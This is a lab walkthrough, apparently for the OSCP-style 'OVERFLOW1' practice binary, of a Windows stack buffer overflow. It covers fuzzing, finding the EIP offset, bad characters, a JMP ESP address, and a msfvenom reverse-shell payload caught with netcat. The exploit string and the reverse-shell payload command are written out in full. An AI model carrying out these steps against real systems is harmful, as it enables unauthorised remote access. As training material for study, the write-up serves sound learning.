## FUZZING
Create a file named "fuzzing.py" and write the following Python code in it. After granting execution permission, let's run the file. After running it, the program reported crashing at 2000 bytes, but this is not a precise value.

## CRASH
After performing an nmap scan to identify open ports, let's connect to the open port using Telnet. We will then display the available commands by typing "HELP" Next, we'll interact with "OVERFLOW1" Initially, we can provide some input like "OSCPOSCP" to see if it responds with "OVERFLOW1 COMPLETE" Then, we can attempt to crash the program by providing a larger input, such as "AAA...AA" with approximately 500 'A' characters. As a result, the program should crash.
To investigate further, we can examine the Registers (FPU) tab. Right-click on the ESP value and select "Follow in Dump" To analyze the output in more detail, right-click on the output, and choose "Hex" with a length of 16 bytes. You will see numerous 'A' values, where '41' represents the hexadecimal value of 'A' The most crucial point here is the EIP value, which indicates the part that EIP overflows into after ESP.

## OFFSET
Let's fill the buffer section and place a pointer in the EIP section. 
Create a file named "offset.py" and write the following Python code into the file.
Important note: We will generate the pattern to be placed in the string section using the command /usr/bin/msf-pattern_create -l 2400 . When we sent 2000 bytes, the program crashed. To obtain a precise result, we are creating a 2400- byte pattern.
Copy the resulting pattern and place it in the string section. Then, run "offset.py." The system crashes. Copy the resulting EIP value (query). Running /usr/bin/msf-pattern_offset -l 2400 -q 6F43396E provided the output "Exact match at offset 1978." This means we need a 1978-byte value to fill the buffer.
Now we can adjust our string section (prefix + "A"*1978) We reran the file, and the program crashed.
As a result of our actions, we successfully filled the buffer section without overwriting the EIP section.
## BADCHARS
Since "badchars" is a 4-byte data, let's add it to the string section as follows:
(prefix + "A"*1978 + "B"*4 + badchars)
Place the following "badchars" into a file named "badchars.py" as a variable.
Run the "badchars.py" file.
We observed that our EIP value is "42424242" (BBBB). Let's examine the ESP value by clicking on the "Follow in dump" option.
We observed that there are corruptions, namely "\x00\x07\x2e\xa0" Now, let's use the Mona module: !mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
As a result, we received a list of memory addresses. Right-click on any of them to copy the address.
Inside the "badchars.py" file, let's paste our EIP value as a comment: #EIP 625011AF
Then, instead of the "B" value in the string section, let's write the EIP value in reverse order:
 string = prefix + "A"*1978 + "\xaf\x11\x50\x62"
This code modification will replace the "B" value with the EIP value in reverse format.

## SYSTEM PENETRATION
Let's create a payload to gain privileges on the system. Use the following command to generate the payload
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py
NOT: EDIT THE OUTPUT.
1. Create a buf variable (buf = " ").
2. Remove all 'b' letters in the entire line.
Let's edit the string section in the "exploit.py" file: string = prefix + "A"*1978 + "\xaf\x11\x50\x62"+"\x90"*16+buf
Start listening with Netcat, then run the "exploit.py" file. The expected result: A session will be established.
